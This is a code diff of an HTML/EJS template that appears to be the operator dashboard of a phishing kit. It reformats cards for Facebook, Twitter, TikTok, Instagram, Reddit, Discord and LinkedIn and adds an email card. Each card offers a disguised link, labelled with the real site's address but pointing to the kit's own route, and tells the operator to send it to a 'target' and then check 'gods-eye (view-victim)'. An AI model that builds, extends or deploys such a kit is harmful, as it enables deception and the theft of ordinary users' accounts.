@@ -12,10 +12,11 @@
             </button>
             <a href="/facebook?userId=<%= userId %>">https://www.facebook.com</a>
         </div>
-        <p><strong>Instruction:</strong> Copy the link and send it to your target; when the target hits it, check your gods-eye (view-victim).</p>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target; when the target hits it, check your
+            gods-eye (view-victim).</p>
     </div>
 
-    
+
     <!-- THIS IS FOR TWITTER  -->
     <div class="twitter">
         <div class="icon">
@@ -28,7 +29,8 @@
             </button>
             <a href="/twitter?userId=<%= userId %>">https://www.twitter.com</a>
         </div>
-        <p><strong>Instruction:</strong> Copy the link and send it to your target; when the target hits it, check your gods-eye (view-victim).</p>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target; when the target hits it, check your
+            gods-eye (view-victim).</p>
     </div>
 
 
@@ -44,72 +46,96 @@
             </button>
             <a href="/tiktok?userId=<%= userId %>">https://www.tiktok.com</a>
         </div>
-        <p><strong>Instruction:</strong> Copy the link and send it to your target; when the target hits it, check your gods-eye (view-victim).</p>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target; when the target hits it, check your
+            gods-eye (view-victim).</p>
     </div>
 
 
-<!-- THIS IS FOR INSTAGRAM  -->
-<div class="instagram">
-    <div class="icon">
-        <i class="fa-brands fa-instagram"></i>
+    <!-- THIS IS FOR INSTAGRAM  -->
+    <div class="instagram">
+        <div class="icon">
+            <i class="fa-brands fa-instagram"></i>
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/instagram?userId=<%= userId %>')">
+                <i class="fa-solid fa-link"></i> Copy IG URL
+            </button>
+            <a href="/instagram?userId=<%= userId %>">https://www.instagram.com</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits it, check your
+            gods-eye (view-victim).</p>
     </div>
-    <!-- Copy URL Button -->
-    <div class="url">
-        <button onclick="copyURL('/instagram?userId=<%= userId %>')">
-            <i class="fa-solid fa-link"></i> Copy IG URL
-        </button>
-        <a href="/instagram?userId=<%= userId %>">https://www.instagram.com</a>
-    </div>
-    <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits it, check your gods-eye (view-victim).</p>
-</div>
 
 
-<!-- THIS IS FOR REDDIT  -->
-<div class="reddit">
-    <div class="icon">
-        <i class="fa-brands fa-reddit-alien"></i>
+    <!-- THIS IS FOR REDDIT  -->
+    <div class="reddit">
+        <div class="icon">
+            <i class="fa-brands fa-reddit-alien"></i>
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/reddit?userId=<%= userId %>')">
+                <i class="fa-solid fa-link"></i> Copy Reddit URL
+            </button>
+            <a href="/reddit?userId=<%= userId %>">https://www.reddit.com</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits it, check your
+            gods-eye (view-victim).</p>
     </div>
-    <!-- Copy URL Button -->
-    <div class="url">
-        <button onclick="copyURL('/reddit?userId=<%= userId %>')">
-            <i class="fa-solid fa-link"></i> Copy Reddit URL
-        </button>
-        <a href="/reddit?userId=<%= userId %>">https://www.reddit.com</a>
-    </div>
-    <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits it, check your gods-eye (view-victim).</p>
-</div>
 
 
-<!-- THIS IS FOR DISCORD -->
-<div class="discord">
-    <div class="icon">
-        <i class="fa-brands fa-discord"></i>
+    <!-- THIS IS FOR DISCORD -->
+    <div class="discord">
+        <div class="icon">
+            <i class="fa-brands fa-discord"></i>
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/discord?userId=<%= userId %>')">
+                <i class="fa-solid fa-link"></i> Copy DCD URL
+            </button>
+            <a href="/discord?userId=<%= userId %>">https://www.discord.com</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits it, check your
+            gods-eye (view-victim).</p>
     </div>
-    <!-- Copy URL Button -->
-    <div class="url">
-        <button onclick="copyURL('/discord?userId=<%= userId %>')">
-            <i class="fa-solid fa-link"></i> Copy DCD URL
-        </button>
-        <a href="/discord?userId=<%= userId %>">https://www.discord.com</a>
-    </div>
-    <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits it, check your gods-eye (view-victim).</p>
-</div>
 
 
-<!-- THIS IS FOR LINKEDIN -->
-<div class="linkedin">
-    <div class="icon">
-        <i class="fa-brands fa-linkedin"></i>
+    <!-- THIS IS FOR LINKEDIN -->
+    <div class="linkedin">
+        <div class="icon">
+            <i class="fa-brands fa-linkedin"></i>
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/linkedin?userId=<%= userId %>')">
+                <i class="fa-solid fa-link"></i> Copy LKD URL
+            </button>
+            <a href="/linkedin?userId=<%= userId %>">https://www.linkedin.com</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits it, check your
+            gods-eye (view-victim).</p>
     </div>
-    <!-- Copy URL Button -->
-    <div class="url">
-        <button onclick="copyURL('/linkedin?userId=<%= userId %>')">
-            <i class="fa-solid fa-link"></i> Copy LKD URL
-        </button>
-        <a href="/linkedin?userId=<%= userId %>">https://www.linkedin.com</a>
+
+
+    <!-- THIS IS FOR EMAIL -->
+    <div class="email">
+        <div class="icon">
+            <i class="fa-solid fa-envelope"></i>
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/email?userId=<%= userId %>')">
+                <i class="fa-solid fa-link"></i> Copy EM URL
+            </button>
+            <a href="/email?userId=<%= userId %>">https://mail.example.com</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your
+            gods-eye (view-victim).</p>
     </div>
-    <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits it, check your gods-eye (view-victim).</p>
-</div>
+
+
 
 
 
